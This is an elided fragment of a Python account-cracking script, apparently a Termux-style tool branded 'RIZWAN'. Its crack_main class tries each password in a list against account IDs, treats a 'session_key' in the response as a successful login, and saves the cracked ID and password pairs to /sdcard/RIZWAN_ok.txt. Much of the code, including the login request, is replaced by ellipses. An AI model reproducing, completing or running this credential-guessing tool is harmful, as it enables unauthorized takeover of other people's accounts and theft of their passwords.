...
logo= f'''
 ...
 _______ _________ _______                        _        _______ _________ ______   _______ 

(  ____ )\__   __// ___   )|\     /|  |\     /|  ( \      (  ___  )\__   __/(  ___ \ (  ___  )
...
| ) \ \_____) (___ /   (_/\| (___) |  ( /   \ )  | (____/\| )   ( |___) (___| )___) )| )   ( |

|/   \__/\_______/(_______/(_______)  |/     \|  (_______/|/     \|\_______/|/ \___/ |/     \|
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                ...
                try:
                        ...
                        sys.stdout.write('\r[RIZWAN] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        ...
                                        print(' \033[1;32m[RIZU-OK] '+roid+' | '+pas+'\033[0;97m')

                                        open('/sdcard/RIZWAN_ok.txt','a').write(roid+'|'+pas+'\n')
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/RIZWAN_ok.txt')
